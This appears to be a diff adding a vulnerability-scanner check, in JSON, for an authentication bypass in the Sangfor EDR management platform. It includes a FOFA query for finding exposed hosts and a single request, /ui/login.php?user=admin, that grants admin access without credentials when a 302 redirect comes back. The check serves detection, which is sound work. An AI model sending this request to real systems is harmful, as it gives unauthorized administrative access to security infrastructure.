@@ -1,0 +1,67 @@
+{
+  "Name": "Sangfor EDR anyuser login",
+  "Description": "The EDR is a terminal security solution developed by Sangfor Technology Co., Ltd. The EDR management platform supports unified terminal asset management, terminal virus detection and killing, terminal compliance inspection and access control policy management, supports one-click isolation and disposal of security incidents, and the entire network threat location of hot event IOC.",
+  "Product": "Sangfor EDR",
+  "Homepage": "https://edr.sangfor.com.cn/",
+  "DisclosureDate": "2020-08-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "(cert=\"Organization: INFOSEC\" && cert=\"CommonName: 222.222.222.0\") || (body=\"/ui/static/css/login.\" && body=\"/ui/static/js/login.\")",
+  "GobyQuery": "",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://fofa.so"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/ui/login.php?user=admin"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "302",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Location: index.php",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "unauthorized"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Sangfor-EDR"]
+  }
+}
